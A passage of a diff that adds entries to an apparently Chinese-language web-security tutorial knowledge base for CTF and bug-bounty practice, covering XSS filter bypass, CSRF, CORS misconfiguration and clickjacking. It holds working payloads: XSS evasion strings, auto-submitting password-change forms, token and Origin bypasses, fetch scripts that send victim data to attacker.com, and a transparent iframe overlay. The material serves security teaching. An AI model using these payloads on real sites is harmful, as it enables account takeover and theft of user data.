不触发 | 图片加载成功或 src 没失败 | 用 `src=x` 或 `src=1` 保证失败；或换 onload/onfocus 类 |\n| 属性内注入失败 | 没闭合引号，payload 被当成属性值字符串 | 先回显确认包裹字符是 `\"` 还是 `'`，再决定闭合符 |\n| 页面元素被拦截 | CSP 阻止内联事件执行 | 事件属性受 CSP 的 `unsafe-inline` 限制，改测外链脚本或找 CSP 绕过 |\n\n#### 实战要点\n- 触发优先级：`onerror`（资源失败）→ `onload/onpageshow`（加载完成）→ `onfocus/ontoggle`（零交互）→ `onmouseover/onclick`（需交互），逐层往下换。\n- `<details open ontoggle>` 与 `<input autofocus onfocus>` 不依赖资源加载，图片被禁的靶场首选。\n- 过滤 `onerror` 只拦一个事件名，`onload/onfocus/ontoggle/onpointerenter` 往往没在名单里，一次探测集覆盖 6 个事件再挑活的。\n- 属性上下文用\"闭合引号 + 事件 + 收尾引号\"公式：`\" onfocus=alert(1) x=\"`，比闭合标签少一步解析风险。\n- 事件值里需要字符串/函数名变形时，配合 `\\x61lert`、`eval(atob(...))` 等 JS 层编码（见 g-bypass 编码节）。"
+        },
+        {
+          "id": "bypass-blacklist-len",
+          "title": "黑名单绕过与长度截断",
+          "tags": [
+            "xss",
+            "bypass",
+            "blacklist",
+            "length"
+          ],
+          "aliases": [
+            "黑名单绕过",
+            "短payload"
+          ],
+          "difficulty": "hard",
+          "summary": "黑名单无法穷尽 HTML 语法的组合空间，大小写、标签变体、空白符、无引号属性与短 payload 是五大常规突破口。",
+          "content": "\n#### 这个条目的作用\n黑名单过滤永远在\"补丁式\"追堵已知 payload，而 HTML 语法本身组合空间巨大。本条目给出从**字符级探测**到**大小写、空白符、标签变体、无引号属性、长度截断**的完整升级路径，并重点讲解 20 字符以内短 payload 的构造法（昵称、留言字数受限场景）。\n\n#### 前置条件\n- 已定位注入点并能看到回显（响应体或 DOM 渲染结果）\n- 已用无害字符（如 `abcd\"'>`）做过一次探测，确认引号与尖括号的过滤状态\n- 若疑似长度受限，先确认限制值（如昵称限 20 字符）\n\n#### 第 1 步：字符级探测过滤规则\n用一组无害字符确认哪些被删除、被编码、被替换，据此推断过滤是字符级黑名单还是正则：\n```text\n< > \" ' / \\ ( ) ; = javascript alert onerror\n```\n预期结果：逐个测试后得到\"过滤字符清单\"。例如 `<`、`>` 被删 → 走大小写/实体路线；`javascript` 被替换 → 走编码路线；`onerror` 被删 → 换事件名。\n\n#### 第 2 步：大小写与标签变体\n若过滤是区分大小写的（很多正则漏写 `i` 标志），大小写混写直接生效；标签本身也可换等价变体：\n```html\n<ScRiPt>alert(1)</sCrIpT>\n<svg/onload=alert(1)>\n<img src=x onerror=alert(1)\n```\n预期结果：`<ScRiPt>` 被 HTML 解析器不区分大小写地识别为 script。`<svg/onload=...>` 用自闭合斜杠替代空格，绕过\"过滤 `svg onload` 带空格\"的正则。\n\n#### 第 3 步：空白符替换（正则漏网点）\n黑名单常用正则 `\\son\\s*=` 匹配\"空格+on+等号\"，但制表符、换行、回车不在 `\\s` 或列表里时即可绕过：\n```html\n<img src=x\nonerror=alert(1)>\n<img src=x\tonerror=alert(1)>\n```\n预期结果：标签属性间的换行/制表符是合法空白，浏览器照样解析事件属性。若过滤的是字面空格而非正则 `\\s`，这一招几乎必中。\n\n#### 第 4 步：无引号属性 + 属性截断\n属性值不加引号时，空格是属性分隔符，可追加任意属性并\"吞掉\"服务端补的引号：\n```html\n<img src=x onerror=alert(1) x=>\n<input value=x onfocus=alert(1) autofocus>\n```\n预期结果：`x=>` 让尾部不闭合引号也不影响事件执行；`<input value=x onfocus=... autofocus>` 利用\"无引号属性 + autofocus\"零交互触发。这招同时绕\"必须闭合标签\"的假设。\n\n#### 第 5 步：长度受限场景构造短 payload\n昵称限 20 字符之类场景，用最短触发结构 + 外置载荷：\n```html\n<svg/onload=alert(1)>        <!-- 21 字符 -->\n<img src=x onerror=alert(1)> <!-- 26 字符 -->\n<svg onload=alert(1)>        <!-- 20 字符 -->\n```\n超短方案——把完整载荷放进 `window.name`（窗口名不参与请求、不受长度限制）：\n```html\n<svg onload=eval(name)>\n```\n预期结果：`eval(name)` 会把 `window.name` 当作 JS 执行。打开方式为 `<a target=evil href=\"//target.com/page\">`，`window.name=payload` 由攻击页设置，落地页仅需 19 字符的触发壳。\n\n#### 第 6 步：截断型利用（服务端截断场景）\n若服务端对输入做了固定长度截断且截断点落在属性中间，被截断的\"属性残骸\"不破坏已闭合的语法：\n```html\n<img src=x onerror=alert(1) x=\n```\n预期结果：尾部 `x=` 被截断成不完整属性，浏览器容忍未闭合属性，`onerror` 照常触发。**注意**：每个站点截断长度不同，必须先用长字符串实测截断点，再设计 payload 让执行部分落在截断点之前。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 大小写变体不生效 | 过滤正则带 `i` 标志，大小写无用 | 放弃大小写，走空白符/标签变体路线 |\n| `<img src=x\\nonerror=...>` 不触发 | 部分解析器要求属性前至少一个 ASCII 空格 | 用制表符 `&#9;` 或 `/` 分隔，或换 `<svg/onload>` 结构 |\n| 短 payload 超字数 | 没算清限制值与最短结构 | 用 `eval(name)` 外置载荷；或试 `<svg onload=alert(1)>` 极限 20 字符 |\n| 截断后语法被破坏 | 截断点落在 `onerror=` 之前 | 实测回显长度，把可截断的废属性放在最后 |\n| payload 被 WAF 语义分析拦截 | 纯黑名单已拦截，WAF 看 payload 语义 | 升级到编码+变形组合（见 g-bypass 编码节与 waf-bypass 技能） |\n\n#### 实战要点\n- 通用对抗顺序：测原始 payload → 字符探测过滤项 → 按 编码 → 事件 → 变体 → 截断 逐层升级，命中即停。\n- 空白符攻击面：空格、制表符 `&#9;`、换行 `&#10;`、回车 `&#13;` 四种都试一遍，正则 `\\s` 漏哪种用哪种。\n- 长度受限的万能解法是 `window.name` 外置载荷，触发壳固定 19 字符，改 `name` 即换攻击逻辑。\n- 截断型利用依赖站点行为，先拿无害长字符串实测截断点，不要凭猜构造。\n- 黑名单\"补丁式\"的本质决定冷门标签恒有活口：`<marquee onstart>`、`<math><mtext>`、`<video><source onerror>` 轮流试。"
+        }
+      ]
+    },
+    {
+      "id": "g-csrf",
+      "name": "CSRF",
+      "intro": "利用浏览器自动携带 cookie 的机制，诱导目标以受害者身份提交请求，核心是找到无 token 校验的写操作",
+      "entries": [
+        {
+          "id": "csrf-principle",
+          "title": "原理与前提",
+          "tags": [
+            "csrf",
+            "principle",
+            "cookie"
+          ],
+          "aliases": [
+            "CSRF原理"
+          ],
+          "difficulty": "easy",
+          "summary": "只要目标站点的写操作仅靠 cookie 鉴权，攻击者就能用一张页面替受害者完成该操作，一切前提围绕\"浏览器自动带 cookie\"。",
+          "content": "\n#### 这个条目的作用\nCSRF 的成立不取决于攻击者有多强，而取决于目标站点的**鉴权设计**。本条目讲清楚三个成立前提、攻击链路，以及一个 30 秒的判定速查法，让你拿到任意\"改数据\"接口就能判断它是否可被 CSRF。\n\n#### 前置条件\n- 有一个可登录的目标账号（用于抓包观察自己的请求）\n- 浏览器开发者工具（F12）或抓包工具可用\n- 理解基础 HTTP：GET/POST、请求头、cookie\n\n#### 第 1 步：理解\"浏览器自动带 cookie\"机制\n浏览器向 `target.com` 发请求时，只要 cookie 属于该域（且 SameSite 允许），就**自动**附上，无需页面代码参与。攻击者页面在 `attacker.com` 上发起的跨站请求，同样自动携带 `target.com` 的 cookie。\n```txt\n受害者已登录 target.com (cookie 有效)\n    -> 诱导访问 attacker.com/evil.html\n    -> evil.html 里的 form/图片自动向 target.com 发请求\n    -> 浏览器自动携带 target.com 的 cookie\n    -> 服务器认为是受害者本人操作 -> 状态被修改\n```\n预期结果：理解整个链条的唯一\"魔法\"就是最后一行——服务端只认 cookie，不认请求是否真的来自受害者本人点击。\n\n#### 第 2 步：核对三个成立前提\n1. 目标请求**仅凭 cookie 鉴权**，无自定义头（如 `X-Requested-With`）、无 token 参数\n2. 受害者浏览器存在目标域有效 cookie\n3. 攻击者能构造出与目标请求等价的跨站请求（HTML form 跨域不受同源策略限制）\n预期结果：三条全满足 → CSRF 成立。第 1 条是唯一需要技术验证的，进入下一步。\n\n#### 第 3 步：抓取写操作请求并逐项检查\n用自己账号执行一个写操作（改密码、删数据、转账、改资料），在 F12 网络面板抓包，检查三点：\n```http\nPOST /change/password HTTP/1.1\nHost: target.com\nCookie: sessionid=abc123\nContent-Type: application/x-www-form-urlencoded\n\nnewpass=hacked123&confirm=hacked123\n```\n- 请求头里有没有自定义头（`X-Requested-With`、`X-CSRF-Token` 等）？\n- body 里有没有 token 字段（`csrf`、`_token`、`authenticity_token`）？\n- 响应是否校验 `Referer`/`Origin`？\n\n预期结果：三者皆无 → 大概率可直接 CSRF。有 token → 转 g-csrf 的 token 绕过一节。\n\n#### 第 4 步：等价请求验证（证明 CSRF 成立）\n不用等到攻击阶段，把抓到的请求**去掉所有自定义头**后用 form 重放，成功即证明：\n```html\n<html><body>\n<form action=\"https://target.com/change/password\" method=\"POST\">\n  <input type=\"hidden\" name=\"newpass\" value=\"hacked123\">\n  <input type=\"hidden\" name=\"confirm\" value=\"hacked123\">\n</form>\n<script>document.forms[0].submit()</script>\n</body></html>\n```\n预期结果：打开该 HTML 后密码被修改 → CSRF 实锤。若失败，检查是否缺自定义头（说明有额外校验）或 SameSite 拦截（现代浏览器默认 Lax，见 g-csrf SameSite 一节）。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| form 重放后操作未生效 | 请求需要自定义头或 token | 用同源页面里的 fetch 带全头重放，确认后归入\"有条件 CSRF\" |\n| 重放成功但认为是自己操作的 | 没区分\"带 cookie 的跨站请求\"与\"自己点击\" | CSRF 的本质就是\"等价请求\"，form 重放成功即成立，无需真实跨站 |\n| GET 型接口也能改数据 | 幂等性缺失，本就是高危 | 直接 img 触发即可，见 g-csrf payload 模板 |\n| 现代浏览器下 POST 被拦 | SameSite=Lax 默认阻断跨站 POST | 改测 GET 型写操作或同站子域，见 SameSite 速查表 |\n\n#### 实战要点\n- 判定速查：抓写操作请求 → 看有无自定义头 / body 内 token → 皆无即大概率可 CSRF，全程 30 秒。\n- 前提 1（仅 cookie 鉴权）是唯一要动手验证的，其余两条是浏览器与网络环境的既定事实。\n- 现代浏览器默认 `SameSite=Lax` 已拦跨站 POST，但同站子域、`SameSite=None+Secure`、老站裸 cookie 仍可行。\n- CSRF 的价值在于**静默**：受害者无感知，配合 XSS 可链式升级（见 g-stored 打管理员一节）。\n- 报告时给出复现：抓包请求 + 等价 form 页面 + 操作生效的证据（如密码可登录）。"
+        },
+        {
+          "id": "csrf-payload-templates",
+          "title": "GET/POST 表单模板",
+          "tags": [
+            "csrf",
+            "payload",
+            "form"
+          ],
+          "aliases": [
+            "CSRF模板"
+          ],
+          "difficulty": "easy",
+          "summary": "最稳的 CSRF 载体是纯 HTML form（跨域不受同源策略限制），伪装成普通页面即可诱导提交。",
+          "content": "\n#### 这个条目的作用\n前提验证通过后，本条目给出三种可直接复用的攻击载体：GET 型（img 无感触发）、POST 型（form 自动提交）、JSON 型（Content-Type 校验缺失时），以及每种载体的适用条件与验证流程。\n\n#### 前置条件\n- 已按 g-csrf 原理节确认目标写操作无 token/无自定义头\n- 已抓包拿到目标接口的完整 URL 与参数名\n- 有可控的托管位置放攻击 HTML（自己的服务器、GitHub Pages、本地起 http server 均可）\n\n#### 第 1 步：GET 型——img 无感触发\n目标写操作是 GET 且参数全在 URL 时，用 `<img>` 标签，受害者打开页面即触发，无任何弹窗与跳转：\n```html\n<img src=\"https://target.com/user/delete?id=123\">\n```\n预期结果：页面加载时浏览器向该 URL 发 GET，携带 target.com cookie。`<img>` 天然跨域可加载，是最隐蔽的载体。\n\n#### 第 2 步：POST 型——form 自动提交\n目标接口是 POST 时用隐藏表单 + JS 自动提交，这是最可靠、最通用的载体：\n```html\n<html><body>\n<form action=\"https://target.com/change/password\" method=\"POST\" id=\"f\">\n  <input type=\"hidden\" name=\"newpass\" value=\"hacked123\">\n  <input type=\"hidden\" name=\"confirm\" value=\"hacked123\">\n</form>\n<script>document.getElementById('f').submit()</script>\n</body></html>\n```\n预期结果：页面打开瞬间表单自动提交，参数以 `application/x-www-form-urlencoded` 发送，与正常表单提交完全等价。`name` 值必须与抓包时的一致。\n\n#### 第 3 步：JSON 型——Content-Type 校验缺失时\n接口要求 JSON body 但服务端不校验 Content-Type 时，用 `enctype=\"text/plain\"` 让 form 发送裸 JSON 文本：\n```html\n<form action=\"https://target.com/api/user\" method=\"POST\"\n      enctype=\"text/plain\">\n<input type=\"hidden\" name='{\"role\":\"admin\",\"x\":\"' value='\"}'>\n</form>\n```\n预期结果：请求体拼接为 `{\"role\":\"admin\",\"x\":\"=\"}`，若服务端用宽松 JSON 解析即可生效。注意这招依赖服务端对 Content-Type 不敏感，**少见**，先测再报。\n\n#### 第 4 步：验证载体是否生效\n把载体 HTML 放到攻击页，用**另一个浏览器/无痕窗口**（保持目标登录态）打开，观察：\n- F12 网络面板：目标接口收到请求且无 4xx/5xx\n- 目标站点状态确实改变（如密码已可登录、数据已删除）\n预期结果：状态改变 = 载体有效。务必用自己的测试账号，不要真的伤害他人数据。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| form 提交后 403/400 | 接口需要自定义头或 Referer 校验 | 回 g-csrf 原理节复查前提；或改用 XSS 同源页面发请求 |\n| JSON 型 payload 不生效 | 服务端强校验 `Content-Type: application/json` | 换回标准 form；或先测 OPTIONS/直接 curl 确认接受格式 |\n| 无痕窗口打开不触发 | 目标 cookie 没带进来（未登录/跨域隔离） | 确认无痕窗口已登录目标站点；SameSite 阻断时看 SameSite 节 |\n| 参数名拼错 | 抓包参数名与表单 name 不一致 | 严格照抄抓包 body 的字段名与顺序 |\n\n#### 实战要点\n- 常规优先 form + POST；GET 型只在接口确实是 GET 时用 img，隐蔽性最高。\n- 检测思路：用自己的账号抓任意\"改数据\"请求，去掉自定义头后用 form 重放，成功即证明 CSRF 成立，无需攻击阶段。\n- `enctype=\"text/plain\"` 的 JSON 注入依赖服务端对 Content-Type 不敏感，多数框架不校验 → form 直接可用，先试普通 form 再试 JSON 型。\n- 攻击页务必伪装成正常页面（按钮、文案、跳转），避免受害者起疑；提交后跳转到正常页面收尾。\n- 验证永远用自己的测试账号，payload 里用无害值，别把漏洞验证做成真实破坏。"
+        },
+        {
+          "id": "csrf-token-bypass-samesite",
+          "title": "token 绕过与 SameSite 简述",
+          "tags": [
+            "csrf",
+            "token",
+            "samesite"
+          ],
+          "aliases": [
+            "token绕过",
+            "SameSite"
+          ],
+          "difficulty": "hard",
+          "summary": "有 token 不等于安全，token 在 GET/响应体/跨域读取中泄露、双提交与同源判断缺陷都是经典绕法；SameSite 则是现代浏览器默认防线。",
+          "content": "\n#### 这个条目的作用\n面对\"有 token 的接口\"不要直接放弃：token 的生成、传输、校验三个环节各有经典缺陷。本条目覆盖四条 token 泄露路径、双提交缺陷、同源判断缺陷，以及 SameSite 四种取值的可利用性速查，是 CSRF 深入题的完整地图。\n\n#### 前置条件\n- 已确认接口存在 token 校验（抓包能看到 `csrf`/`_token` 字段或自定义头）\n- 已理解 cookie 的 Domain/Path 与 SameSite 三个取值（Lax/Strict/None）\n- 有测试账号与攻击页托管环境\n\n#### 第 1 步：排查 token 泄露路径（四条逐一验证）\ntoken 只要能被攻击者拿到，校验即形同虚设：\n```text\n1. token 出现在 URL 参数（Referer 会外泄）\n2. token 在 localStorage 且被同源 XSS/开放重定向读取\n3. JSONP/开放 CORS 接口可跨域读取含 token 的响应\n4. token 嵌入响应头且与表单分离（如 X-CSRF-Token 每次请求刷新）\n```\n预期结果：逐条验证后若有命中，即可构造携带真实 token 的跨站请求。第 3 条最常见——先找有没有返回 token 的 JSONP 接口，跨域 script 标签加载 JSONP 不受同源限制。\n\n#### 第 2 步：利用双提交缺陷\n部分站点在 cookie 存一份 token、表单带一份，只比对两者是否相等。此时攻击者在自己的域种同名 cookie 即可过校验：\n```html\n<script>document.cookie='csrf=attacker_token';</script>\n<form action=\"https://target.com/pay\" method=\"POST\">\n  <input type=\"hidden\" name=\"csrf\" value=\"attacker_token\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n预期结果：攻击页先把 `csrf` cookie 写入 `attacker.com` 域（跨站请求会一并携带），表单再提交相同值，服务端比对\"相等\"即通过。**注意**：cookie 若设了 `Domain=target.com` 且服务端按域校验，此招失效，需先测 cookie 的 Domain 属性。\n\n#### 第 3 步：利用同源判断缺陷\ntoken 之外站点常校验 `Referer`/`Origin`，其判断逻辑本身常有缺陷：\n- 只校验 `Referer` 前缀/包含 → 用 `http://target.com.attacker.com` 或 `https://attacker.com?u=target.com` 触发\n- 校验 Origin 白名单但允许 `null` → 用 sandbox iframe 或 `data:` 页面发起请求\n```html\n<!-- sandbox iframe 发出的请求 Origin 为 null -->\n<iframe sandbox=\"allow-forms\" src=\"data:text/html,<form action='https://target.com/pay' method='POST'><input name='csrf' value='x'></form><script>document.forms[0].submit()</script>\"></iframe>\n```\n预期结果：`Referer` 含目标域名即放行的站点被前缀伪造绕过；允许 `null` Origin 的站点被 sandbox iframe 绕过。逐条试白名单的边界。\n\n#### 第 4 步：SameSite 判定（现代浏览器默认防线）\n抓 Set-Cookie 看 SameSite 值，对照可利用性：\n| 值 | 行为 | 可利用性 |\n|---|---|---|\n| 未设置（Lax 默认） | 跨站顶层导航 GET 带 cookie，POST 不带 | GET 型 CSRF 仍可行 |\n| Strict | 跨站一律不带 | 不可直接 CSRF |\n| None + Secure | 全带（需 HTTPS） | 完全可利用 |\n| SameSite=Lax + 同站子域 | 子域间视为同站 | 需先拿下子域 |\n预期结果：Lax 下优先找 GET 型写操作（顶层导航 GET 仍带 cookie）；None+Secure 则 POST 模板直接可用；Strict 基本放弃直接 CSRF，转向 XSS 组合。\n\n#### 第 5 步：SameSite=Lax 下的 GET 触发技巧\nLax 允许\"跨站顶层导航\"携带 cookie，若目标有 GET 型写操作（`/delete?id=`、`/logout?redirect=`），用普通链接诱导点击即可：\n```html\n<a href=\"https://target.com/user/delete?id=123\">查看图片</a>\n```\n或配合\"提交后立即跳转\"的 form 技巧，把 POST 伪装成顶层导航。预期结果：点击链接触发的 GET 携带 cookie 并执行操作。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 双提交 cookie 不生效 | cookie 带 Domain=target.com 或 HttpOnly 限制 | 检查 Set-Cookie 属性；换 token 泄露路径（JSONP/CORS） |\n| Referer 伪造无效 | 站点校验完整 Origin 且白名单精确 | 试 `null` Origin（sandbox iframe）或找子域 |\n| SameSite=Lax 下 POST 全被拦 | Lax 阻断跨站 POST | 转 GET 型操作；或先通过 XSS/子域把请求变成同站 |\n| token 在 URL 里但 Referer 被禁 | 浏览器/隐私设置禁 Referer 导致判断失效 | 抓包看实际 Referer 是否外泄；优先验证 JSONP 读取 |\n\n#### 实战要点\n- 判定顺序：token 泄露路径（JSONP/CORS/URL/存储）→ 双提交 → 同源判断缺陷 → SameSite。命中任一即成立。\n- JSONP/开放 CORS 读取 token 是最值钱的路径：一次跨域读取，后续 POST 模板直接复用真实 token。\n- 现代靶场与 CTF 多模拟\"无 SameSite\"或\"Lax + GET 操作\"的旧站配置；真实 SRC 中 Lax 是默认，优先看 GET 型写操作或可用子域。\n- 双提交绕过前提是 cookie 无 `Domain` 限制且服务端只比\"相等\"，务必先抓 Set-Cookie 验证。\n- SameSite=Strict 不等于绝对安全：同源 XSS 可发起任意请求，CSRF 只是其中一种升级路径。"
+        }
+      ]
+    },
+    {
+      "id": "g-cors",
+      "name": "CORS 与点击劫持",
+      "intro": "错误的跨域配置让接口可被读取，iframe 覆盖让点击被劫持，两类都是\"配置即漏洞\"",
+      "entries": [
+        {
+          "id": "cors-aca-reflect",
+          "title": "ACAO 反射与利用链",
+          "tags": [
+            "cors",
+            "aca",
+            "data-theft"
+          ],
+          "aliases": [
+            "CORS配置错误"
+          ],
+          "difficulty": "medium",
+          "summary": "站点若把 `Access-Control-Allow-Origin` 直接反射请求 Origin，攻击者就能用 JS 跨域读取接口数据（含用户信息），性质等同读取型漏洞。",
+          "content": "\n#### 这个条目的作用\n同源策略禁止跨域读取，但错误配置的 CORS 会把这道墙自己拆掉。本条目讲清\"ACAO 反射 + Credentials\"的高危组合如何判定，fetch 利用链如何写，以及预检（preflight）阶段的测试要点，让你能完整验证一个可跨域读取的接口。\n\n#### 前置条件\n- 已找到一个返回敏感数据的接口（如 `/api/me`、`/api/userinfo`）\n- 浏览器开发者工具或 curl 可用\n- 有攻击页托管位置（自己的服务器或本地 http server，**file:// 打开无 Origin 头**，测不了反射）\n\n#### 第 1 步：判定漏洞——手动加 Origin 看响应\n对目标接口发起带恶意 Origin 的请求，观察响应头是否原样反射：\n```http\nGET /api/userinfo HTTP/1.1\nHost: target.com\nOrigin: https://evil.com\n-->\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true\n```\n预期结果：`ACAO: https://evil.com` 被反射 = 配置错误。**反射 + `Allow-Credentials: true` 是最高危组合**，浏览器允许跨域读取携带 cookie 的响应；仅反射 ACAO 无 Credentials 时只能读公开数据，价值低。\n\n#### 第 2 步：验证组合——带 cookie 的跨域读取\n用 curl 快速验证，或直接在攻击页用 fetch 验证。curl 关注响应头即可：\n```bash\ncurl -i -H \"Origin: https://evil.com\" -H \"Cookie: sessionid=abc123\" https://target.com/api/me\n```\n预期结果：响应同时含 `Access-Control-Allow-Origin: https://evil.com` 与 `Access-Control-Allow-Credentials: true`，且 body 含登录态数据 → 漏洞成立。\n\n#### 第 3 步：编写利用链——跨域读数据并外带\n在攻击页用 `credentials:'include'` 跨域读取（这是带 cookie 的关键），再把数据外带到自己服务器：\n```html\n<script>\nfetch('https://target.com/api/me', {credentials:'include'})\n  .then(r=>r.json())\n  .then(d=>new Image().src='//attacker.com/?d='+JSON.stringify(d));\n</script>\n```\n预期结果：受害者打开攻击页后，其登录态数据出现在 attacker.com 的访问日志里。`new Image()` 外带不跳转不弹窗，隐蔽性好。\n\n#### 第 4 步：测预检（preflight）——OPTIONS 是否同样反射\n当请求带非简单头（如 `Content-Type: application/json`、自定义头）或复杂 body 时，浏览器先发 OPTIONS 预检，预检通过才发正式请求：\n```http\nOPTIONS /api/me HTTP/1.1\nOrigin: https://evil.com\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: content-type\n-->\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Methods: POST\nAccess-Control-Allow-Headers: content-type\n```\n预期结果：OPTIONS 响应同样反射 Origin 并放行方法/头 → 预检可通过，正式请求照发。**判断漏洞时必须同时测 OPTIONS 是否反射**，只测 GET 会漏掉 POST 接口。\n\n#### 第 5 步：无 Credentials 时的升级路径\n只反射 ACAO、无 `Allow-Credentials` 的站读不到 cookie 态数据，但若接口支持 token 类凭据（Authorization 头、localStorage 里的 token），仍可读取：\n```javascript\nfetch('https://target.com/api/me', {headers:{'Authorization':'Bearer '+localStorage.getItem('token')}})\n  .then(r=>r.json())\n  .then(d=>new Image().src='//attacker.com/?d='+JSON.stringify(d));\n```\n预期结果：跨域请求带自定义头会触发预检，预检若放行 `Authorization` 头，token 态数据同样可被读取。GitHub 经典模式：白名单外反射 + 配合 token 头仍可读。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| 反射了 ACAO 但 fetch 读不到数据 | 缺 `Allow-Credentials: true`，浏览器拒绝暴露响应 | 确认组合；无 Credentials 时转 token 头路径 |\n| 忘了 `credentials:'include'` | 浏览器默认跨域 fetch 不带 cookie | 加上该选项，否则读到的不是登录态数据 |\n| POST 请求没发出就被拦 | 预检 OPTIONS 未放行方法/头 | 测 OPTIONS 响应，确认 Allow-Methods/Allow-Headers |\n| file:// 打开攻击页无 Origin | file 协议不发 Origin 头，测不出反射 | 用本地 http server（`python -m http.server`）或真实域名托管 |\n| 响应头带 `Vary: Origin` | 正常缓存行为，不代表无漏洞 | 以实际反射结果为准，忽略 Vary |\n\n#### 实战要点\n- 判定铁律：`ACAO 反射请求 Origin` + `Allow-Credentials: true` = 高危读取型漏洞，等于跨域能读登录态。\n- 检测时 GET、POST、OPTIONS 三种方法都要带 Origin 测一遍，只测 GET 会漏掉 POST 接口的预检反射。\n- `credentials:'include'` 是跨域携带 cookie 的关键，缺它读不到登录态数据——利用链里最容易漏的一行。\n- 只反射无 Credentials 的站价值降级但不为零：token 头（Authorization）路径、公开但敏感的数据仍可读。\n- 利用链统一用 `new Image()` 外带：不发新页面不弹窗，数据落在服务器访问日志即可回收。"
+        },
+        {
+          "id": "cors-clickjacking",
+          "title": "点击劫持 iframe 覆盖",
+          "tags": [
+            "clickjacking",
+            "iframe",
+            "x-frame-options"
+          ],
+          "aliases": [
+            "点击劫持"
+          ],
+          "difficulty": "easy",
+          "summary": "站点未配置 `X-Frame-Options` / CSP `frame-ancestors` 时，攻击者把目标页面套进透明 iframe，用户点击的其实是目标页上的按钮。",
+          "content": "\n#### 这个条目的作用\n点击劫持（Clickjacking）不靠注入代码，而是靠\"页面可以被 iframe 嵌入\"这个配置缺陷：攻击者把目标页面透明地盖在自己页面上，再用一个诱饵按钮引导用户点击。用户以为在点\"抽奖\"，实际点中的是目标页上的\"删除账号\"。学完本节，你能独立判定一个页面能否被嵌入，并写出完整可用的覆盖利用页。\n\n#### 前置条件\n- 一个浏览器（Chrome/Firefox 即可）与开发者工具（F12）\n- 目标站点上有一个\"危险操作\"页面：删除账号、转账、改密码、发布内容的按钮\n- 一个可以保存 .html 文件的本地目录（利用页就是本地文件，无需部署服务器）\n\n#### 第 1 步：判定目标页能否被 iframe 嵌入\n打开目标危险页面的开发者工具 → Network 面板 → 刷新页面 → 点击该页面的主文档请求 → 看 Response Headers。判定依据：\n- 响应头**没有** `X-Frame-Options`，且没有 `Content-Security-Policy: frame-ancestors ...` → 可被嵌入，漏洞成立\n- 有 `X-Frame-Options: DENY` 或 `SAMEORIGIN` → 浏览器拒绝嵌入，此页面不可利用\n- 有 CSP `frame-ancestors 'none'` 或 `'self'` → 同样不可利用\n\n如果不想开开发者工具，也可以在终端直接请求：\n```txt\ncurl -I https://target.com/delete-account\n```\n看返回头里有没有 `x-frame-options` 与 `content-security-policy`。预期结果：两个头都缺失 → 进入下一步。如果不行（有防护头）：换一个同域其他页面再测，或直接放弃该页面。\n\n> [!tip]\n> 判定只看**主文档响应头**。页面里有没有 iframe、有没有 JS 都不影响嵌入判定，浏览器在加载 iframe 之前就检查这两个头。\n\n#### 第 2 步：写一个最小可见 iframe 测试页\n先别透明化，用可见 iframe 确认\"能嵌进去、能看到内容\"：\n```html\n<html><body>\n<iframe src=\"https://target.com/delete-account\" width=\"500\" height=\"500\"></iframe>\n</body></html>\n```\n保存为 `test.html`，双击用浏览器打开。预期结果：目标页面完整显示在 iframe 里。如果不行：若页面白屏或显示\"拒绝连接\"，多半是被防护头拦截，回到第 1 步复核响应头。\n\n> [!warn]\n> 若目标站有 CSP `frame-ancestors` 或 X-Frame-Options，这里就会加载失败，这是正常现象，不代表测试环境坏了。\n\n#### 第 3 步：定位目标页上危险按钮的位置\n目标按钮在 iframe 里的坐标 = 按钮距离 iframe 左上角的偏移。方法：用第 2 步的可见 iframe，在目标页面里按 F12 选中危险按钮，执行 `document.querySelector('按钮选择器').getBoundingClientRect()` 读取它的 `top` 与 `left` 两个数字。CTF 靶场里危险按钮通常就在页面中部，可以先目测估算再微调。\n\n#### 第 4 步：构建透明覆盖页\n把 iframe 设成透明、绝对定位，再把诱饵按钮精确叠在目标按钮上方：\n```html\n<html><body>\n<style>\n  iframe {\n    opacity: 0.01;\n    position: absolute;\n    top: 0; left: 0;\n    z-index: 10;\n  }\n  .bait {\n    position: absolute;\n    top: 200px; left: 100px;   /* 与目标按钮坐标对齐 */\n    z-index: 20;\n  }\n</style>\n<iframe src=\"https://target.com/delete-account\" width=\"500\" height=\"500\"></iframe>\n<button class=\"bait\" style=\"width:120px;height:40px\">点我领奖</button>\n</body></html>\n```\n预期结果：用户看到的只有\"点我领奖\"按钮，点击时实际命中 iframe 内的目标按钮。如果不行（点了没反应）：说明对齐有偏差，进入第 5 步校准。\n\n> [!warn]\n> `opacity` 用 `0.01` 而不是 `0`：完全透明的元素在部分浏览器里有特殊处理，且接近透明的 iframe 更容易排查对齐问题。别忘了 `z-index`，否则诱饵按钮会被 iframe 盖住点不到。\n\n#### 第 5 步：校准对齐\n先用 `opacity: 1`（可见）测试：点击诱饵按钮，看是否\"看起来\"落在目标按钮正中，然后逐像素调整 `.bait` 的 `top/left`。校准完成后把 opacity 改回 0.01。若目标页面有滚动条导致按钮位置随视口变化，把 iframe 宽高设为恰好容纳目标按钮所在的整块区域，或利用 iframe 的 `onload` 先滚动到目标按钮位置再取坐标。\n\n#### 第 6 步：验证利用成立\n用测试账号（CTF 里用靶场账号）让\"受害者\"点击诱饵按钮。预期结果：目标站出现对应操作记录（账号被删、转账成功、密码被改）。验证成立后，在报告中附上响应头证据（无 X-Frame-Options / frame-ancestors）+ 利用页源码 + 点击前后的对比记录。\n\n> [!danger]\n> 点击劫持的正确防御是双写：`Content-Security-Policy: frame-ancestors 'none'` + `X-Frame-Options: DENY`。报告里若发现目标只配了其中一个，也值得指出\"防护不完整\"。\n\n#### 常见错误与排查\n\n| 现象 | 原因 | 解决 |\n|---|---|---|\n| iframe 白屏/拒绝加载 | 目标页有 X-Frame-Options 或 frame-ancestors | 复核响应头，换同域无防护的页面再测 |\n| 点了诱饵没反应 | 按钮坐标没对齐 | 先用 opacity:1 可见对位，再逐像素校准 |\n| 诱饵按钮点不到 | 缺 z-index 或 iframe 盖住按钮 | iframe 设 